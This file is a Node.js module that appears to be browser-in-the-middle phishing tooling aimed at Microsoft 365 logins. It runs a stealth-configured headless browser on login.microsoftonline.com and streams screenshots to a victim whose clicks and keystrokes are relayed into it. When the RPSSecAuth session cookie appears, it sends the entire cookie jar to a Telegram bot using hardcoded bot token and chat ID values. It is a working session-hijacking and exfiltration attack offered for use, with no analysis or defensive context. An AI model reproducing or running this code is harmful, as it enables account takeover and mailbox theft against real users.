const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 7000 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) {}
    return { 
        "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
        "TG_CHAT_ID": "1318100118"
    };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;
    try {
        // Only sends ONE message when the strict condition is met
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🎯 TARGET VERIFIED: ${host}</b>\n<b>Key:</b> RPSSecAuth Detected\n<b>Jar Size:</b> ${cookies.length}\n<b>Access:</b> Mailbox Authorized`,
            parse_mode: 'HTML'
        });

        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `FULL_ACCESS_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {}
}

async function startSession(io, socket) {
    let browser = null;
    let captured = false;

    try {
        const userDataDir = path.join(__dirname, `session_${Date.now()}`);

        browser = await puppeteer.launch({
            headless: "new",
            userDataDir: userDataDir,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process'
            ]
        });

        const [page] = await browser.pages();
        await page.setViewport({ width: 1280, height: 720 });
        
        await page.evaluateOnNewDocument(() => {
            const newProto = navigator.__proto__;
            delete newProto.webdriver;
            navigator.__proto__ = newProto;
        });

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // --- THE STRICT VALIDATOR POLLER ---
        const monitor = setInterval(async () => {
            if (captured) return;
            try {
                const cookies = await page.cookies();
                
                // STRICT CONDITION: Look for the specific Session Data Key
                const rpsKey = cookies.find(c => c.name === 'RPSSecAuth');

                if (rpsKey && rpsKey.value.length > 50) {
                    captured = true; // Prevents duplicate logs
                    console.log("💎 RPSSecAuth FOUND. CAPTURING FULL JAR...");

                    // Final 3-second settle to catch the last-minute 'ESTSAUTH' updates
                    setTimeout(async () => {
                        const matureJar = await page.cookies();
                        await sendExfiltration(matureJar, page.url());
                    }, 3000);
                }
            } catch (e) {}
        }, 4000); // Poll every 4 seconds to reduce resource overhead

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        socket.on('disconnect', async () => {
            clearInterval(monitor);
            clearInterval(stream);
            if (browser) await browser.close();
            if (fs.existsSync(userDataDir)) fs.rmSync(userDataDir, { recursive: true, force: true });
        });

    } catch (err) { if (browser) await browser.close(); }
}

module.exports = { startSession };
